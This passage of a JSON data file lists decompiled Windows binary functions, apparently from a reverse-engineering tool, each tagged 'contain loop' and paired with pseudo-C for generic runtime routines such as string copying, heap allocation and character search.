pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x3b;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x47;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x53;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 2);\n        for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x154) = iVar6;\n            iVar6 = fcn.004038dc(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x55]);\n            if (iVar6 != 0) goto code_r0x004bcbd2;\n        }\n        piVar9 = ppcVar4[0x55];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x158) = iVar6;\n            iVar6 = fcn.004038dc(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x56]);\n            if (iVar6 != 0) goto code_r0x004bcbd2;\n        }\n        piVar9 = ppcVar4[0x56];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x15c) = iVar6;\n            iVar6 = fcn.004038dc(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x57]);\n            if (iVar6 != 0) goto code_r0x004bcbd2;\n        }\n        piVar9 = ppcVar4[0x57];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (iStack12 == 1) {\n            iVar6 = iStack16 + (pcVar11 & 0xfffffffe);\n            *(iStack16 + 0x160) = iVar6;\n            iVar6 = fcn.004038dc(iVar6, pcStack20 - pcVar11 >> 1, ppcVar4[0x58]);\n            if (iVar6 != 0) {\ncode_r0x004bcbd2:\n                fcn.004035f8(0, 0, 0, 0, 0);\n                pcVar5 = swi(3);\n                iVar6 = (*pcVar5)();\n                return iVar6;\n            }\n        }\n        piVar9 = ppcVar4[0x58];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        iStack12 = iStack12 + 1;\n        pcVar11 = pcVar11 + ((piVar9 - piVar1 >> 1) + 1) * 2;\n    } while (iStack12 < 2);\n    if (cStack32 != '\\0') {\n        *(iStack44 + 0x350) = *(iStack44 + 0x350) & 0xfffffffd;\n    }\n    return iStack16;\n}\n",
        "token_count": 4372
    },
    "0040631b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040631b(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004060f5(0);\n    iVar4 = *(arg_8h + 0xc);\n    while (iVar4 != 0) {\n        iVar4 = iVar4 + -1;\n        piVar1 = *(*(arg_8h + 8) + iVar4 * 4);\n        if (piVar1 != NULL) {\n            pcVar2 = *(*piVar1 + 8);\n            (**0x573000)();\n            puVar3 = (*pcVar2)();\n            if (puVar3 != NULL) {\n                pcVar2 = **puVar3;\n                (**0x573000)(1);\n                (*pcVar2)();\n            }\n        }\n    }\n    fcn.004040d9(*(arg_8h + 8));\n    fcn.00403684();\n    return;\n}\n",
        "token_count": 242
    },
    "00406631": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406631(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.0040665e(arg_14h);\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 126
    },
    "0046033a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0046033a(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStack20 [8];\n    uint uStack12;\n    \n    do {\n        uStack12 = 0x45d86f;\n        iVar2 = fcn.0040159b();\n        if (iVar2 != 0) {\n            return;\n        }\n        uStack12 = 0x45d862;\n        iVar2 = fcn.004040de(param_1);\n    } while (iVar2 != 0);\n    if (param_1 != -1) {\n        fcn.00404462();\n        fcn.004066d1(auStack20, 0x567380);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00401aa0();\n    fcn.004066d1(auStack20, 0x560c44);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 233
    },
    "00460b7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460b7c(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = arg_8h;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004029a0(arg_8h, pcVar2 - (arg_8h + 1));\n    return;\n}\n",
        "token_count": 110
    },
    "00465e71": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465e71(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.0040665e(arg_18h);\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 131
    },
    "00468555": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00468555(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    uint32_t arg_1ch;\n    int32_t iVar1;\n    int32_t arg_18h;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    arg_1ch = param_2 - param_1 >> 1;\n    uVar3 = 0xffffffff;\n    uVar2 = param_4 - param_3 >> 1;\n    if (param_5 == 0) {\n        iVar1 = fcn.0040379c();\n        iVar1 = *(iVar1 + 4);\n    }\n    else {\n        iVar1 = *(param_5 + 4);\n    }\n    if (iVar1 == 0) {\n        if (uVar2 <= arg_1ch) {\n            fcn.0040576d(param_1, param_3, uVar2 * 2);\n        }\n    }\n    else {\n        arg_18h = fcn.0040159b(arg_1ch);\n        if (arg_18h != 0) {\n            uVar3 = fcn.004045b1(iVar1, 0x400, param_3, uVar2, arg_18h, arg_1ch);\n            if (uVar3 == 0) {\n                uVar3 = fcn.004045b1(iVar1, 0x400, param_3, uVar2, 0, 0);\n                if (uVar3 == 0) {\n                    uVar3 = 0x7fffffff;\n                }\n            }\n            else {\n                uVar2 = 0;\n                if (uVar3 != 0) {\n                    do {\n                        *(param_1 + uVar2 * 2) = *(uVar2 + arg_18h);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < uVar3);\n                }\n            }\n        }\n        fcn.004040d9(arg_18h);\n        uVar2 = uVar3;\n    }\n    return uVar2;\n}\n",
        "token_count": 487
    },
    "00484f45": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00484f45(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (param_1 < 0xffffffe1) {\n        if (param_1 == 0) {\n            param_1 = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5705b8, 0, param_1);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.0040483b();\n        } while ((iVar1 != 0) && (iVar1 = fcn.004040de(param_1),  iVar1 != 0));\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 194
    },
    "00488d29": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00488d29(uint8_t *param_1, uint8_t *param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(param_1 + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*param_1 & 0x80) != 0 && ((*param_2 & 0x10) != 0))))\n    {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(param_2 + 4)) {\n            puVar3 = *(param_2 + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x004884a3:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x004884a8;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x004884a3;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x004884a8:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&\n           ((((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)) && (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 525
    },
    "00488df2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00488df2(uint8_t *param_1, uint8_t *param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(param_1 + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*param_1 & 0x80) != 0 && ((*param_2 & 0x10) != 0))))\n    {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(param_2 + 4)) {\n            puVar3 = *(param_2 + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x004884a3:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x004884a8;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x004884a3;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x004884a8:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&\n           ((((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)) && (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 525
    },
    "004a93c1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.004a93c1(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    char **ppcVar10;\n    char **arg_8h;\n    char **ppcStack44;\n    char **ppcStack40;\n    uint uStack36;\n    char **ppcStack32;\n    char *pcStack28;\n    char *pcStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char **ppcStack12;\n    uint uStack8;\n    \n    if (param_2 == NULL) {\n        puVar3 = fcn.004039a4();\n        iVar8 = 0x16;\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        pcVar7 = NULL;\n        *param_2 = 0;\n        iVar8 = *param_1;\n        ppcStack44 = NULL;\n        ppcStack40 = NULL;\n        uStack36 = 0;\n        ppcVar10 = ppcStack44;\n        while (ppcStack44 = ppcVar10,  iVar8 != 0) {\n            uStack8 = CONCAT13(uStack8 >> 0x18, 0x3f2a);\n            iVar8 = fcn.00402b0d(iVar8, &uStack8);\n            if (iVar8 == 0) {\n                iVar8 = fcn.004c4b06(*param_1, 0, 0, &ppcStack44);\n            }\n            else {\n                iVar8 = fcn.004c4cc4(*param_1, iVar8, &ppcStack44);\n            }\n            ppcVar10 = ppcStack44;\n            ppcStack12 = iVar8;\n            if (iVar8 != 0) goto code_r0x004c478a;\n            param_1 = param_1 + 1;\n            iVar8 = *param_1;\n        }\n        uStack8 = NULL;\n        pcStack16 = (ppcStack40 - ppcVar10 >> 2) + 1;\n        uVar9 = ~-(ppcStack40 < ppcVar10) & (ppcStack40 - ppcVar10) + 3U >> 2;\n        ppcStack12 = ppcVar10;\n        if (uVar9 != 0) {\n            uVar6 = 0;\n            do {\n                pcVar5 = *ppcStack12;\n                pcStack20 = pcVar5 + 1;\n                do {\n                    cVar1 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar1 != '\\0');\n                pcVar7 = pcVar5 + pcVar7 + (1 - pcStack20);\n                ppcStack12 = ppcStack12 + 1;\n                uVar6 = uVar6 + 1;\n                uStack8 = pcVar7;\n            } while (uVar6 != uVar9);\n        }\n        iVar8 = fcn.00405ea7(pcStack16, uStack8, 1);\n        if (iVar8 == 0) {\n            iVar8 = -1;\n            ppcStack12 = 0xffffffff;\n        }\n        else {\n            pcStack16 = iVar8 + pcStack16 * 4;\n            pcStack28 = pcStack16;\n            if (ppcVar10 != ppcStack40) {\n                ppcStack32 = iVar8 - ppcVar10;\n                ppcStack12 = ppcVar10;\n                do {\n                    pcStack24 = *ppcStack12;\n                    pcStack20 = pcStack24;\n                    do {\n                        cVar1 = *pcStack20;\n                        pcStack20 = pcStack20 + 1;\n                    } while (cVar1 != '\\0');\n                    pcStack20 = pcStack20 + (1 - (pcStack24 + 1));\n                    iVar4 = fcn.004029af(pcStack16, uStack8 + (pcStack28 - pcStack16), pcStack24, pcStack20);\n                    if (iVar4 != 0) {\n                        fcn.004035f8(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar8 = (*pcVar2)();\n                        return iVar8;\n                    }\n                    *(ppcStack32 + ppcStack12) = pcStack16;\n                    ppcStack12 = ppcStack12 + 1;\n                    pcStack16 = pcStack16 + pcStack20;\n                } while (ppcStack12 != ppcStack40);\n            }\n            ppcStack12 = NULL;\n            *param_2 = iVar8;\n            iVar8 = 0;\n        }\n        fcn.00406302(0);\ncode_r0x004c478a:\n        uVar6 = 0;\n        uVar9 = ~-(ppcStack40 < ppcVar10) & ppcStack40 + (3 - ppcVar10) >> 2;\n        arg_8h = ppcVar10;\n        ppcStack32 = ppcVar10;\n        pcStack28 = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.00406302(*ppcVar10);\n                uVar6 = uVar6 + 1;\n                ppcVar10 = ppcVar10 + 1;\n                iVar8 = ppcStack12;\n                arg_8h = ppcStack44;\n            } while (uVar6 != uVar9);\n        }\n        fcn.00406302(arg_8h);\n    }\n    return iVar8;\n}\n",
        "token_count": 1311
    },
    "004a93ce": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004a93ce(int16_t **param_1, int16_t **param_2)\n\n{\n    int16_t iVar1;\n    int16_t *arg_10h;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int16_t **ppiVar8;\n    int16_t **arg_8h;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int16_t *in_stack_ffffffc8;\n    int16_t **ppiStack48;\n    int16_t **ppiStack44;\n    uint uStack40;\n    int16_t **ppiStack36;\n    int16_t *piStack32;\n    int16_t *piStack28;\n    int16_t **ppiStack24;\n    int32_t iStack20;\n    uint32_t uStack16;\n    ushort uStack12;\n    uint32_t uStack8;\n    \n    uStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    ppiStack36 = param_2;\n    ppiStack24 = param_1;\n    if (param_2 == NULL) {\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        uVar10 = 0;\n        *param_2 = NULL;\n        piVar5 = *param_1;\n        ppiStack48 = NULL;\n        ppiStack44 = NULL;\n        uStack40 = 0;\n        ppiVar8 = ppiStack48;\n        while (ppiStack48 = ppiVar8,  piVar5 != NULL) {\n            uStack16 = 0x3f002a;\n            uStack12 = 0;\n            ppiStack24 = param_1;\n            iVar4 = fcn.004038c8(piVar5, &uStack16);\n            if (iVar4 == 0) {\n                iStack20 = fcn.004c4be3(*param_1, 0, 0, &ppiStack48);\n            }\n            else {\n                iStack20 = fcn.004c4fb0(*param_1, iVar4, &ppiStack48);\n            }\n            ppiVar8 = ppiStack48;\n            if (iStack20 != 0) goto code_r0x004c4a23;\n            param_1 = ppiStack24 + 1;\n            piVar5 = *param_1;\n        }\n        iStack20 = 0;\n        piStack32 = (ppiStack44 - ppiVar8 >> 2) + 1;\n        uVar9 = ~-(ppiStack44 < ppiVar8) & (ppiStack44 - ppiVar8) + 3U >> 2;\n        ppiStack24 = ppiVar8;\n        if (uVar9 != 0) {\n            uVar7 = 0;\n            do {\n                piVar5 = *ppiStack24;\n                piStack28 = piVar5 + 1;\n                do {\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n                iStack20 = iStack20 + 1 + (piVar5 - piStack28 >> 1);\n                ppiStack24 = ppiStack24 + 1;\n                uVar7 = uVar7 + 1;\n            } while (uVar7 != uVar9);\n        }\n        piVar5 = fcn.00405ea7(piStack32, iStack20, 2);\n        if (piVar5 == NULL) {\n            iStack20 = -1;\n        }\n        else {\n            piStack32 = piVar5 + piStack32 * 2;\n            in_stack_ffffffc8 = piStack32;\n            ppiStack24 = ppiVar8;\n            if (ppiVar8 != ppiStack44) {\n                uStack16 = piVar5 - ppiVar8;\n                do {\n                    arg_10h = *ppiStack24;\n                    piVar6 = arg_10h;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != 0);\n                    piStack28 = (piVar6 - (arg_10h + 1) >> 1) + 1;\n                    iVar4 = fcn.00405a92(piStack32, iStack20 - (piStack32 - in_stack_ffffffc8 >> 1), arg_10h, piStack28)\n                    ;\n                    if (iVar4 != 0) {\n                        fcn.004035f8(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    *(uStack16 + ppiStack24) = piStack32;\n                    ppiStack24 = ppiStack24 + 1;\n                    piStack32 = piStack32 + piStack28;\n                } while (ppiStack24 != ppiStack44);\n            }\n            iStack20 = 0;\n            *ppiStack36 = piVar5;\n        }\n        fcn.00406302(0);\ncode_r0x004c4a23:\n        uVar9 = ~-(ppiStack44 < ppiVar8) & ppiStack44 + (3 - ppiVar8) >> 2;\n        arg_8h = ppiVar8;\n        ppiStack36 = ppiVar8;\n        uStack16 = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.00406302(*ppiVar8);\n                uVar10 = uVar10 + 1;\n                ppiVar8 = ppiVar8 + 1;\n                arg_8h = ppiStack48;\n            } while (uVar10 != uVar9);\n        }\n        fcn.00406302(arg_8h);\n    }\n    fcn.00403085(in_stack_ffffffc8);\n    return;\n}\n",
        "token_count": 1375
    },
    "004c36bf": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.004c36bf(uchar (*param_1) [16], uint8_t param_2)\n\n{\n    char *pcVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uchar (*pauVar4) [16];\n    uint32_t uVar5;\n    int32_t iVar6;\n    uchar (*pauVar7) [16];\n    char *pcVar8;\n    uint8_t *puVar9;\n    uchar auVar11 [16];\n    uchar auVar13 [16];\n    char cVar16;\n    char cVar17;\n    char cVar18;\n    char cVar19;\n    char cVar20;\n    char cVar21;\n    char cVar22;\n    uchar auVar15 [16];\n    uint8_t *puVar10;\n    uint8_t uVar12;\n    uint8_t uVar14;\n    \n    if (*0x56ec4c != 0) {\n        if (*0x56ec4c < 2) {\n            auVar15 = pshuflw(ZEXT216(CONCAT11(param_2, param_2)), ZEXT216(CONCAT11(param_2, param_2)), 0);\n            uVar3 = -1 << (param_1 & 0xf);\n            pcVar8 = param_1 - (param_1 & 0xf);\n            pauVar7 = NULL;\n            while( true ) {\n                uVar14 = -(pcVar8[0xf] == '\\0');\n                auVar13 = CONCAT115(uVar14, CONCAT114(-(pcVar8[0xe] == '\\0'), \n                                                      CONCAT113(-(pcVar8[0xd] == '\\0'), \n                                                                CONCAT112(-(pcVar8[0xc] == '\\0'), \n                                                                          CONCAT111(-(pcVar8[0xb] == '\\0'), \n                                                                                    CONCAT110(-(pcVar8[10] == '\\0'), \n                                                                                              CONCAT19(-(pcVar8[9] ==\n                                                                                                        '\\0'), CONCAT18(\n                                                            -(pcVar8[8] == '\\0'), \n                                                            CONCAT17(-(pcVar8[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar8[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar8[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar8[4] == '\\0'), \n                                                                                                CONCAT13(-(pcVar8[3] ==\n                                                                                                          '\\0'), \n                                                            CONCAT12(-(pcVar8[2] == '\\0'), \n                                                                     CONCAT11(-(pcVar8[1] == '\\0'), -(*pcVar8 == '\\0')))\n                                                            )))))))))))));\n                cVar16 = SUB161(auVar15 >> 8, 0);\n                cVar17 = SUB161(auVar15 >> 0x10, 0);\n                cVar18 = SUB161(auVar15 >> 0x18, 0);\n                cVar19 = SUB161(auVar15 >> 0x20, 0);\n                cVar20 = SUB161(auVar15 >> 0x28, 0);\n                cVar21 = SUB161(auVar15 >> 0x30, 0);\n                cVar22 = SUB161(auVar15 >> 0x38, 0);\n                uVar12 = -(pcVar8[0xf] == cVar22);\n                auVar11 = CONCAT115(uVar12, CONCAT114(-(pcVar8[0xe] == cVar21), \n                                                      CONCAT113(-(pcVar8[0xd] == cVar20), \n                                                                CONCAT112(-(pcVar8[0xc] == cVar19), \n                                                                          CONCAT111(-(pcVar8[0xb] == cVar18), \n                                                                                    CONCAT110(-(pcVar8[10] == cVar17), \n                                                                                              CONCAT19(-(pcVar8[9] ==\n                                                                                                        cVar16), \n                                                                                                       CONCAT18(-(pcVar8\n                                                            [8] == SUB161(auVar15, 0)), \n                                                            CONCAT17(-(pcVar8[7] == cVar22), \n                                                                     CONCAT16(-(pcVar8[6] == cVar21), \n                                                                              CONCAT15(-(pcVar8[5] == cVar20), \n                                                                                       CONCAT14(-(pcVar8[4] == cVar19), \n                                                                                                CONCAT13(-(pcVar8[3] ==\n                                                                                                          cVar18), \n                                                                                                         CONCAT12(-(\n                                                            pcVar8[2] == cVar17), \n                                                            CONCAT11(-(pcVar8[1] == cVar16), \n                                                                     -(*pcVar8 == SUB161(auVar15, 0)))))))))))))))));\n                uVar5 = (SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (uVar14 >> 7) << 0xf) & uVar3;\n                if (uVar5 != 0) break;\n                uVar3 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf) & uVar3;\n                iVar6 = 0x1f;\n                if (uVar3 != 0) {\n                    for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                    }\n                }\n                if (uVar3 != 0) {\n                    pauVar7 = pcVar8 + iVar6;\n                }\n                uVar3 = 0xffffffff;\n                pcVar8 = pcVar8 + 0x10;\n            }\n            uVar3 = (uVar5 * 2 & uVar5 * -2) - 1 &\n                    (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf) & 